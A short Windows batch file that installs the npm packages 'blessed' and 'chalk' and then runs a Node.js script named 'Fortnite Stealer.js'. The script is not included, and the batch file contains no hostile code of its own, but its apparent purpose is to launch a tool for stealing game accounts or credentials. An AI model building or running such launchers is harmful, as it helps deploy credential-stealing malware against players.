@echo off

:: Install the required npm packages
start cmd /k "npm install blessed chalk && echo Packages installed successfully. && pause && exit"

:: Run the Node.js script
start cmd /k node "Fortnite Stealer.js"
